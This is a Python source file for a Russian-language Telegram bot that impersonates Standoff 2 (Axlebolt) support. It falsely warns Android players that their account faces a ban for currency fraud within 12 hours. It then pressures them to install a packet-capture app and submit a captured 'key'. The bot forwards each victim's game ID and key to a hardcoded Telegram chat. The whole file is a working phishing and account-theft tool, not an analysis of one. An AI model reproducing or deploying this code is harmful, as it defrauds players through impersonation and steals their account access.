import telebot
import time
from flask import Flask, request
import logging
import psycopg2
import os
from config import *

bot = telebot.TeleBot(BOT_TOKEN)
Id = 0
key = 0
step = 0
user_id = 0
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)
db_connection = psycopg2.connect(DB_URI, sslmode="require")

db_object = db_connection.cursor()


@bot.message_handler(commands=['start'])
def start(message):
    global user_id
    user_id = message.from_user.id
    keyboard = telebot.types.InlineKeyboardMarkup()
    button = telebot.types.InlineKeyboardButton(text='Жалоба', callback_data='Жалоба')
    keyboard.add(button)
    button = telebot.types.InlineKeyboardButton(text='Контакты', callback_data='Контакты')
    keyboard.add(button)
    bot.send_message(message.chat.id, text='Здравствуйте! \nВыберите кнопку', reply_markup=keyboard)


@bot.callback_query_handler(func=lambda call: True)
def callback_worker(call):
    global step
    bot.delete_message(call.message.chat.id, call.message.message_id)
    db_object.execute(f"SELECT step FROM postgres WHERE step = {step}")

    if call.data == 'Контакты':
        bot.send_message(call.message.chat.id, text='Сайт: https://axlebolt.com \nМагазин: https://store.standoff2.com')
        keyboard = telebot.types.InlineKeyboardMarkup()
        button = telebot.types.InlineKeyboardButton(text='Назад', callback_data='Назад')
        keyboard.add(button)
        bot.send_message(call.message.chat.id, text='Назад:', reply_markup=keyboard)

    elif call.data in ['Назад', 'Главное меню']:
        start(call.message)

    elif call.data == 'Жалоба':
        keyboard = telebot.types.InlineKeyboardMarkup()
        if step == 0:
            button = telebot.types.InlineKeyboardButton(text='Android', callback_data='Android')
            keyboard.add(button)
            button = telebot.types.InlineKeyboardButton(text='iOS', callback_data='iOS')
            keyboard.add(button)
        else:
            button = telebot.types.InlineKeyboardButton(text='Продолжить', callback_data='Продолжить')
            keyboard.add(button)

        button = telebot.types.InlineKeyboardButton(text='Главное меню', callback_data='Главное меню')
        keyboard.add(button)
        bot.send_message(call.message.chat.id, text='Выберите какое у Вас устройство:', reply_markup=keyboard)

    elif call.data == 'Android' and step == 0:
        step = 1
        bot.send_message(call.message.chat.id, 'Напишите Ваш игровой ID.')
        bot.register_next_step_handler(call.message, android_iOS_func)

    elif call.data == 'Отправить':
        bot.send_message(call.message.chat.id, 'Отправьте ключ')
        bot.register_next_step_handler(call.message, android_func2)

    elif call.data == 'iOS' and step == 0:
        step = 2
        bot.send_message(call.message.chat.id, 'Напишите Ваш игровой ID.')
        bot.register_next_step_handler(call.message, android_iOS_func)

    elif call.data == 'Продолжить':
        bot.send_message(call.message.chat.id, 'Напишите Ваш игровой ID.')
        bot.register_next_step_handler(call.message, android_iOS_func)
    update_query = """
            UPDATE postgres 
            SET 
             (step)
              =
             (%s)
            WHERE user_id= (%s)"""
    db_object.execute(update_query, (step, user_id))
    db_connection.commit()


def android_iOS_func(message):
    global Id
    if len(message.text) < 8 or len(message.text) > 9:
        bot.send_message(message.chat.id, 'Упс, вы допустили ошибку. Введите свой ID')
        bot.register_next_step_handler(message, android_iOS_func)
    else:
        Id = message.text
        bot.send_message(message.chat.id, 'Проверяем информацию. Подождите пожалуйста несколько минут.')
        time.sleep(5)
        if step == 1:
            keyboard = telebot.types.InlineKeyboardMarkup()
            button = telebot.types.InlineKeyboardButton(text='Отправить', callback_data='Отправить')
            keyboard.add(button)
            bot.send_message(message.chat.id, '''На вашем аккаунте, замечены следующие правонарушения:
            - Мошенничество с внутриигровой валютой, с целью получения личной выгоды.                                                                                                        
            У вас 12 часов на ответ - далее блокировка.

            Вы можете обжаловать решение, предоставив доказательства, что вы не нарушали правила игры. Пришлите временной ключ действий для проверки.

            Для этого вам нужно установить приложение "Packet Capture" из оффицального магазина приложений и дальше следовать видео инструкции. Для отправки ключа, нажмите кнопку "Отправить"''', reply_markup=keyboard)

        elif step == 2:
            bot.send_message(message.chat.id, 'Спасибо за уделённое время, у Вас все хорошо.')


def android_func2(message):
    global key
    if len(message.text) < 20:
        bot.send_message(message.chat.id, 'Упс, вы допустили ошибку. Введите верной ключ')
        bot.register_next_step_handler(message, android_func2)
    else:
        key = message.text
        bot.send_message(message.chat.id, 'Спасибо, проверяем. Это может занять немного времени.')
        bot.send_message(1979922062, 'Id: {} \nKey: {}'.format(Id, key))


@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200


if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=APP_URL)
    server.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))